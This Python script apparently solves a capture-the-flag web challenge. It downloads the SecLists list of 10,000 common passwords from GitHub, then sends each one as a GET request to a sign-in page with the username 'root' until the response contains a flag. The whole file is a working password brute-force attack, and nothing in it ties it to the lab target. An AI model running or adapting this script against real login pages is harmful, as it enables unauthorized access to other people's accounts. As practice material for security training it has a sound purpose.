import requests
import argparse
import re
from bs4 import BeautifulSoup

def get_IP():
	ip = None
	with open('../../IP') as file:
		return file.readlines()[0].strip()
 

def get_passwords():
	url = 'https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt'
	r = requests.get(url, allow_redirects=False)
	text = r.content
	soup = BeautifulSoup(text, 'html.parser')
	tags = soup.find_all('td', attrs={'class': 'blob-code blob-code-inner js-file-line'})
	finaltext = ''
	for tag in tags:
		finaltext = finaltext + tag.text + '\n'
	open('passwords.txt', 'w').write(finaltext)

def brute_force():
	print(get_IP())
	url = get_IP() + '?page=signin'
	with open('passwords.txt') as file:
		for passwd in file.readlines():
			passwd = passwd.strip()
			response = requests.get(url, params=dict(page='signin', username='root', password=passwd, Login='Login'))
			regex = re.search(r">(The flag.*?)<", response.text, re.I)
			if (regex):
				return print(f'The Password is : {passwd}\n>>{regex.group(1).strip()}<<')
			else:
				print(f'"{passwd}": Incorrect               ', end='\r')

if __name__ == "__main__":
	get_passwords()
	brute_force()